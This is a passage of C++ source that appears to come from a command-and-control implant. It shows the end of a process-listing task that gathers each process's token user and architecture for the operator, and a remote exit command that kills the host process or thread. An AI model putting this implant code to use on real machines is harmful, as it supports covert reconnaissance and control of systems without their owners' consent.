                Self->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );

                Self->Tkn->GetUser( &UserToken, &UserLen, TokenHandle );            

                if ( !UserToken ) {
                    Self->Pkg->Str( Package, "N/A" );
                } else {
                    Self->Pkg->Str( Package, UserToken );
                }

                // NtQueryInformationProcess( ProcessHandle, )
            
                Self->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
                
                Self->Pkg->Int32( Package, Isx64 );

                // FileTime.dwHighDateTime = SysProcInfo->CreateTime.HighPart;
                // FileTime.dwLowDateTime  = SysProcInfo->CreateTime.LowPart;
            
                // Self->Krnl32.FileTimeToSystemTime( &FileTime, &CreateTime );
            
                // Self->Pkg->Int16( Package, CreateTime.wDay );
                // Self->Pkg->Int16( Package, CreateTime.wMonth );
                // Self->Pkg->Int16( Package, CreateTime.wYear );
                // Self->Pkg->Int16( Package, CreateTime.wHour );
                // Self->Pkg->Int16( Package, CreateTime.wMinute );
                // Self->Pkg->Int16( Package, CreateTime.wSecond );
                
                SysThreadInfo = SysProcInfo->Threads;
            
                // for (INT i = 0; i < SysProcInfo->NumberOfThreads; i++) {
                    // Self->Pkg->Int32( Package, HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) );
                    // Self->Pkg->Int64( Package, U_PTR( SysThreadInfo[i].StartAddress ) );
                    // Self->Pkg->Int32( Package, SysThreadInfo[i].Priority );
                    // Self->Pkg->Int32( Package, SysThreadInfo[i].ThreadState );
                // }
            
                if ( ProcessHandle ) Self->Ntdll.NtClose( ProcessHandle );
            
                SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            } while ( SysProcInfo->NextEntryOffset );

            break;
        }
    } 

    if ( GLOBAL_PKG ) GLOBAL_PKG = NULL;

    KhRetSuccess;
}

auto DECLFN Task::Exit(
    _In_ PJOBS Job
) -> ERROR_CODE {
    INT8 ExitType = Self->Psr->Byte( Job->Psr );

    if ( ExitType == SbExitProcess ) {
        Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
    } else if ( ExitType == SbExitThread ) {
        Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
    }

    return KhRetSuccess;
}